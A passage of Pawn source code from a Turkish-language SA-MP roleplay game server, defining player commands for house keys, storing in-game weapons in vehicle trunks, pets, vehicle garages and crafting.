				return SendClientMessage(playerid, COLOR_GRAD2, "Kendinden ev anahtarýný alamazsýn.");
			new
				szMessage[128];

			if(HouseKey[giveplayerid] != INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse] == HouseKey[giveplayerid]) {
				HouseKey[giveplayerid] = INVALID_HOUSE_ID;
				format(szMessage, sizeof(szMessage), "%s evinin anahtarlarýný aldý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "%s adlý kiþiden evinin anahtarlarýný aldýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþi senin evinin anahtarlarýna sahip deðil.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evanahtarlarinial [Oyuncu ID/Ýsim] [Ev 1/2]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "Kendi kendinden anahtar alamazsýn.");

			new
				szMessage[128],
				firstorsecond[30];

			if(HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse] || HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse2]) {
				if(houseid == 1 && HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse]) {
					HouseKey[giveplayerid] = INVALID_HOUSE_ID;
					firstorsecond = "first";
				}
				else if(houseid == 2 && HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse2]) {
					HouseKey[giveplayerid] = INVALID_HOUSE_ID;
					firstorsecond = "second";
				}
				else return SendClientMessage(playerid, COLOR_GRAD1, "Yanlýþ Ev ID.");

				format(szMessage, sizeof(szMessage), "%s ev anahtarlarýný geri aldý: Ev: %s.", GetPlayerNameEx(playerid), firstorsecond);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), " %s evinin anahtarlarýný %s adlý kiþiden geri aldýn.", firstorsecond, GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþi senin ev anahtarlarýna sahip deðil.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
    return 1;
}

CMD:evanahtarlari(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");

	new
		szMessage[128],
		count;
	SendClientMessage(playerid, COLOR_GREEN, "--------------------- [ Ev Anahtarlarý ] ---------------------");
	foreach(Player, i) {
		if(PlayerInfo[playerid][pHouse] == HouseKey[i] && PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "Ev 1 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}else if(PlayerInfo[playerid][pHouse2] == HouseKey[i] && PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "Ev 2 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}
	}
	if(count == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Ev anahtarlarýný kimseye vermedin.");
    return 1;
}

CMD:bilgilendirme(playerid, params[]) {
	new string[128];
	format(string, sizeof string, "Teamspeak: {EFEFEF}178.20.225.202{FFFFFF} | Websitesi: %s{EFEFEF}" WEBSITE);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:aracakoy(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)) { SendClientMessage(playerid, COLOR_WHITE, "Araç içersindeyken bunu yapamazsýn!"); return 1; }
	if(GetPVarInt(playerid, "EMSAttempt") != 0) return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanamazsýn!");

	if(PlayerInfo[playerid][pFaction] != 0 && PlayerInfo[playerid][pFaction] != 4)
		return SendClientMessage(playerid, COLOR_GRAD2, "Faction'dayken bunu yapamazsýn.");

	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aracakoy [silah] [slot]");

	new pvid = -1, Float: x, Float: y, Float: z;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
		if(IsPlayerInRangeOfPoint(playerid, 4.5, x, y, z))
		{
			pvid = d;
			break;
		}
	}
	if(pvid == -1) return SendClientMessage(playerid,COLOR_GREY,"Sahip olduðun bir aracýn yanýnda deðilsin.");
	GetVehicleParamsEx(PlayerVehicleInfo[playerid][pvid][pvId],engine,lights,alarm,doors,bonnet,boot,objective);
	if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET) return SendClientMessage(playerid, COLOR_GRAD3, "Bagaj Kapalý");
	if(GetVehicleModel(PlayerVehicleInfo[playerid][pvid][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][pvid][pvId]) == 510)  return SendClientMessage(playerid,COLOR_GREY,"Bu aracýn bagajý yok.");

	new Float: Health;
	GetPlayerHealth(playerid, Health);
	if(Health < 80.0) return SendClientMessage(playerid,COLOR_GREY,"Canýn 80'in üstünde deðilse bagaja silah koyamazsýn.");
	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "   Baþka bir silah depolamak için %d saniye beklemen gerekiyor.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new maxslots = PlayerVehicleInfo[playerid][pvid][pvWepUpgrade]+1;
	if(slot > maxslots)
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz slot.");
		return 1;
	}

	if(PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu slotta zaten bir silahýn var.");
		return 1;
	}

	new weapon;
	if(strcmp(weaponchoice, "9mm", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet 9mm Pistol koydun.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet 9mm Pistol koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet SD Pistol koydun.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet SD Pistol koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet Deagle koydun..");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet Deagle koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet Shotgun koydun.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet Shotgun koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet SPAS12 koydun.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet SPAS-12 koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet MP5 koydun.");
			weapon = PlayerInfo[playerid][pGuns][4];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet MP5 koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}

	else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet AK-47 koydun.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet AK-47 koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet M4 koydun.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet M4 koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet Tüfek koydun.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet tüfek koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Aracýn bagajýna bir adet Sniper koydun.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s adlý kiþi aracýnýn bagajýna bir adet Sniper koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin.");
	if(PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] == 0)
	{
		PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] = weapon;
		RemovePlayerWeapon(playerid, weapon);
		return 1;
	}
	else { SendClientMessage(playerid,COLOR_GREY,"Yanlýþ silah adý!"); return 1; }
}

CMD:aractanal(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(IsPlayerInAnyVehicle(playerid)) {
		return SendClientMessage(playerid, COLOR_WHITE, "Aracýn içersindeyken bunu yapamazsýn.");
	}
	else if(GetPVarInt(playerid, "PBM") > 0) {
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
	}
	else if(GetPVarInt(playerid, "EventToken") != 0) {
		return SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");
	}
	else if(PlayerInfo[playerid][pConnectTime] < 2) {
		return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");
	}
	else if(GetPVarInt(playerid, "GiveWeaponTimer") >= 1) {

		new
			szMessage[59];

		format(szMessage, sizeof(szMessage), "   Baþka bir silah alabilmek için %d saniye beklemen gerekiyor.", GetPVarInt(playerid, "GiveWeaponTimer"));
		return SendClientMessage(playerid, COLOR_GREY, szMessage);
	}

	new
		Float: fVehPos[3],
		iWeaponSlot = strval(params);

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) {
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], fVehPos[0], fVehPos[1], fVehPos[2]);
			if(IsPlayerInRangeOfPoint(playerid, 4.5, fVehPos[0], fVehPos[1], fVehPos[2])) {
				if(isnull(params)) {

					new
						szMessage[64];

					format(szMessage, sizeof(szMessage), "*** %s adlý kiþinin aracý: %s Bagajý ***", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					for(new s = 0; s < 3; s++) if(PlayerVehicleInfo[playerid][d][pvWeapons][s] != 0) {

						new
							szWeapon[16];

						GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][s], szWeapon, sizeof(szWeapon));
						format(szMessage, sizeof(szMessage), "Slot %d: %s", s+1, szWeapon);
						SendClientMessage(playerid, COLOR_WHITE, szMessage);
					}
					return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aractanal [slot]");
				}
				else if(GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 509) {
					return SendClientMessage(playerid,COLOR_GREY,"Bu aracýn bagajý yok.");
				}

				GetVehicleParamsEx(PlayerVehicleInfo[playerid][d][pvId], engine, lights, alarm, doors, bonnet, boot, objective);

				if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET) {
					return SendClientMessage(playerid, COLOR_GRAD3, "Bagaj kapalý.");
				}
				else if(iWeaponSlot > PlayerVehicleInfo[playerid][d][pvWepUpgrade] + 1) {
					return SendClientMessage(playerid, COLOR_GREY, "Yanlýþ Slot.");
				}
				else if(PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1] != 0) {
					new
						szWeapon[16],
						szMessage[128];

					GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1], szWeapon, sizeof(szWeapon));
					GivePlayerValidWeapon(playerid, PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1], 60000);
					PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1] = 0;

					format(szMessage, sizeof(szMessage), "Aracýnýn bagajýndan bir %s çýkardýn.", szWeapon);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);

					format(szMessage, sizeof(szMessage), "* %s aracýnýn bagajýndan bir %s çýkarýr.", GetPlayerNameEx(playerid), szWeapon);
					return ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else return SendClientMessage(playerid, COLOR_WHITE, "Bu slotta silahýn yok.");
			}
		}
	}
	return SendClientMessage(playerid,COLOR_GREY,"Sahip olduðun bir aracýn içinde deðilsin.");
}
CMD:sqlid(playerid, params[])
{
	new str[128];
	format(str, sizeof(str), "Karakter SQL-ID: %d", PlayerInfo[playerid][pID]);
	SendClientMessage(playerid, -1, str);
	return 1;
}

CMD:pks(playerid, params[]) // pet kontrolü sifirla
{
	if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, 0xFF000000, "[!] Bu komutu kullanamazsýnýz!");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
			PlayerInfo[i][pPetKontrol] = 0;
		}
    }
    SendClientMessage(playerid, -1, "Tüm petlerin kontrolü sýfýrlandý.");
	return 1;
}

CMD:petlerisil(playerid, params[])
{
	if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, 0xFF000000, "[!] Bu komutu kullanamazsýnýz!");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
			DestroyActor(OyuncuKopegi[i]);
	    	DestroyDynamic3DTextLabel(PetText[i]);
		}
    }
    SendClientMessage(playerid, -1, "Tüm çýkan petler silindi.");
	return 1;
}

CMD:petver(playerid, params[])
{
	new userid, deger, str[128];
	if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, 0xFF000000, "[!] Bu komutu kullanamazsýnýz!");
	if(sscanf(params, "ud", userid, deger)) return KullanimMesajiGonder(playerid, "/petver [id/isim] [0-1]");
	if(!IsPlayerConnected(userid)) return SendClientMessage(playerid, 0xFF000000, "[!] Kullanýcý bulunamadý.");
	PlayerInfo[userid][pPet] = deger;
	if(deger == 1)
	{
		format(str, sizeof(str), "{00FF00}[!]{FFFFFF} %s adlý kiþiye pet verdiniz.", GetPlayerNameEx(userid));
		SendClientMessage(playerid, -1, str);
	}
	else if(deger == 0)
	{
		format(str, sizeof(str), "{00FF00}[!]{FFFFFF} %s adlý kiþiden peti aldýnýz.", GetPlayerNameEx(userid));
		SendClientMessage(playerid, -1, str);
	}
	return 1;
}

CMD:pet(playerid, params[])
{
	new string[512], saglikdurumu[128], yazicek[128], durum[128];
    if(!PlayerInfo[playerid][pPet]) return SendClientMessage(playerid, 0xFF000000, "[!] Size ait bir pet yok!");

 	if(PlayerInfo[playerid][pPetCani] < 30) format(saglikdurumu, sizeof(saglikdurumu), "{FF0000}Yaralý{FFFFFF}");
	else if(PlayerInfo[playerid][pPetCani] < 50) format(saglikdurumu, sizeof(saglikdurumu), "{FFA500}Hasta{FFFFFF}");
	else if(PlayerInfo[playerid][pPetCani] <= 100 || PlayerInfo[playerid][pPetCani] > 100) format(saglikdurumu, sizeof(saglikdurumu), "{00FF00}Saðlýklý{FFFFFF}");

    if (!PlayerInfo[playerid][pPetKontrol]) format(durum, 24, "Pet Kontrol Et");
 	else format(durum, 24, "Pet Kontrolü Býrak"); format(yazicek, sizeof(yazicek), "%s", durum);

	format(string, sizeof(string), "Isim\t#\nPet Adý:\t[ %s ]\nPet Durumu:\t[ %s ]\nPet Çaðýr\nPet Besle\n%s\nPet Cinsi\n", PlayerInfo[playerid][pPetAdi], saglikdurumu, durum);
    ShowPlayerDialog(playerid, PET, DIALOG_STYLE_TABLIST_HEADERS, "Pet Sistemi",string,"Tamam","Iptal");
	return 1;
}

CMD:aracbagaji(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Aracýn içersindeyken bagajý kontrol edemezsin.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

	new
		Float: fVehPos[3],
		iCount;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) {
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], fVehPos[0], fVehPos[1], fVehPos[2]);
			if(IsPlayerInRangeOfPoint(playerid, 4.5, fVehPos[0], fVehPos[1], fVehPos[2])) {
				if(GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 509)
					return SendClientMessage(playerid,COLOR_GREY,"Bu aracýn bagajý yok.");

				GetVehicleParamsEx(PlayerVehicleInfo[playerid][d][pvId], engine, lights, alarm, doors, bonnet, boot, objective);
				if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET)
					return SendClientMessage(playerid, COLOR_GRAD3, "Bagaj kapalý.");

				new
					szMessage[64];

				format(szMessage, sizeof(szMessage), "*** %s adlý kiþinin aracý :%s Bagajý ***", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
				for(new s = 0; s < 3; s++) if(PlayerVehicleInfo[playerid][d][pvWeapons][s] != 0) {
					new
						szWeapon[16];

					GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][s], szWeapon, sizeof(szWeapon));
					format(szMessage, sizeof(szMessage), "Slot %d: %s", s+1, szWeapon);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
				iCount ++;
			}
		}
	}
	if(iCount == 0)
		return SendClientMessage(playerid,COLOR_GREY,"Sahip olduðun bir aracýn içersinde deðilsin.");
	return 1;
}

CMD:araclarim(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	new vstring[1024];
	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
			format(vstring, sizeof(vstring), "%s\n%s (El konuldu)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
				format(vstring, sizeof(vstring), "%s\n%s (Men edilmiþ)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvSpawned] != 1) {
				format(vstring, sizeof(vstring), "%s\n%s (Depoda)", vstring, VehicleName[iModelID]);
			}
			else format(vstring, sizeof(vstring), "%s\n%s (Aktif)", vstring, VehicleName[iModelID]);
		}
		else strcat(vstring, "\nBoþ");
	}
	ShowPlayerDialogEx(playerid, VEHICLESTORAGE, DIALOG_STYLE_LIST, "Araç Garajý", vstring, "Çýkart", "Iptal");
 	return 1;
}

CMD:aracidlerim(playerid, params[])
{
	new string[128];
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++)
	{
	    new pvid = PlayerVehicleInfo[playerid][i][pvId];
	    new pvmodel = PlayerVehicleInfo[playerid][i][pvModelId];
	    if(pvid != 0)
	    {
	        format(string, sizeof(string), "Car ID: %s | Car Name: %s", pvid, VehicleName[pvmodel]);
	        SendClientMessage(playerid, COLOR_WHITE, string);
	    }
    	else
		{
		    SendClientMessage(playerid, COLOR_WHITE, "ERROR: You do not own any vehicles.");
		    return 1;
		}
	}
	return 1;
}

CMD:zanaat(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid,COLOR_GREY,"   Zanaatkar deðilsin!");
		return 1;
	}
	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"   Hapishanedeyken zanaat yapamazsýn!");
		return 1;
	}
	new string[128];
	if(GetPVarInt(playerid, "ArmsTimer") > 0)
	{
		format(string, sizeof(string), "   %d saniye beklemen gerekiyor.", GetPVarInt(playerid, "ArmsTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}
	if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5)
	{
		SendClientMessage(playerid, COLOR_GREY, "Hastanedeyken zanaat yapamazsýn.");
		return 1;
	}

	new giveplayerid, choice[32], weapon, price;
	if(sscanf(params, "us[32]", giveplayerid, choice))
	{
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_YELLOW, "<< Kullanilabilir Zanaatler >>");
		SendClientMessage(playerid, COLOR_GRAD1, "tornavida(1000)");
		SendClientMessage(playerid, COLOR_GRAD1, "kolsaati(500) 	tekerlek(250)");
		SendClientMessage(playerid, COLOR_GRAD1, "ilkyardim(1000)	 kamera(250)");
		SendClientMessage(playerid, COLOR_GRAD1, "yerlestirilebilirkamera(8000)	     alici(5000)");
		SendClientMessage(playerid, COLOR_GRAD1, "gps(1000)          bocektemizleyici(10000)");
		SendClientMessage(playerid, COLOR_GRAD1, "parasut(50)");
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /zanaat [Oyuncu ID/Ýsim] [craftname]");
		return 1;
	}
	if(IsPlayerConnected(giveplayerid))
	{
		if(isnull(choice))
		{
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			SendClientMessage(playerid, COLOR_YELLOW, "<< Kullanilabilir Zanaatler >>");
			SendClientMessage(playerid, COLOR_GRAD1, "tornavida(1000)");
			SendClientMessage(playerid, COLOR_GRAD1, "kolsaati(500) 	tekerlek(250)");
			SendClientMessage(playerid, COLOR_GRAD1, "ilkyardim(1000)	 kamera(250)");
